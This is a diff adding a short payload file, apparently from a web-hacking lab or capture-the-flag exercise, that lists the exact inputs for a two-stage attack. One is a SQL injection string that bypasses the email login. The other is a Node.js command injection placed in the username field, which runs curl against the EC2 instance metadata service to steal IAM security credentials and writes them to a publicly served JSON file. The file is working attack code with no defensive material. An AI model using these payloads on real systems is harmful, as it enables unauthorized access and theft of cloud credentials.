@@ -1,0 +1,15 @@
+#This file contains the specific payloads used to exploit the web application vulnerabilities.
+
+### STAGE 1: SQL Injection (Authentication Bypass) ###
+# Target Field: Email Login
+# Logic: Forces the SQL query to return TRUE, bypassing password check.
+' or 1=1;--
+
+
+### STAGE 2: Command Injection (Credential Theft) ###
+# Target Field: User Profile -> Username
+# Logic: Uses Node.js 'child_process' to execute a curl command against the EC2 IMDS.
+# It retrieves the session token, requests the IAM security credentials, 
+# and saves them to a public .json file.
+
+#{global..mainModule.require('child_process').exec('CREDURL=http://169.254.169.254/latest/meta-data/iam/security-credentials/;TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s $CREDURL | echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN") && echo $CRED | json_pp >frontend/dist/frontend/assets/public/credentials.json')}
